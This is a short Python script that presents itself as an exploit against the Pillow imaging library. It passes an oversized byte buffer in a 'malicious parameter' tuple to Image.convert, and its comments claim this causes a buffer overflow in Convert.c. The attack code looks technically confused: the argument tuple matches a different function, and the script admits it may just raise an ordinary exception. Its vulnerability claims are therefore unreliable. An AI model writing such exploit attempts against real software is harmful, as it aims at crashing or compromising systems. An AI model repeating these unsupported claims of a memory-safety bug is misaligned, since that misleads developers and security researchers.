# Import the Pillow library
from PIL import Image

# Open an image file
try:
    img = Image.open("image.jpg")
except FileNotFoundError:
    print("Error: image.jpg not found. Please make sure the file exists in the same directory.")
    exit()

# Define a malicious parameter that causes a buffer overflow
# This parameter is a tuple of (mode, size, data, decoder_name, args)
# The data is a bytes object that is larger than the expected size
param = ("RGB", (100, 100), b"\x00" * 1000000, "raw", None)

# Pass the parameter directly into the convert function
# This will trigger the buffer overflow in Convert.c and crash the program
try:
    img.convert(*param)
except Exception as e:
    print(f"Error during image conversion: {e}")
    print("The code attempted to cause a buffer overflow, and it either succeeded or raised another exception.")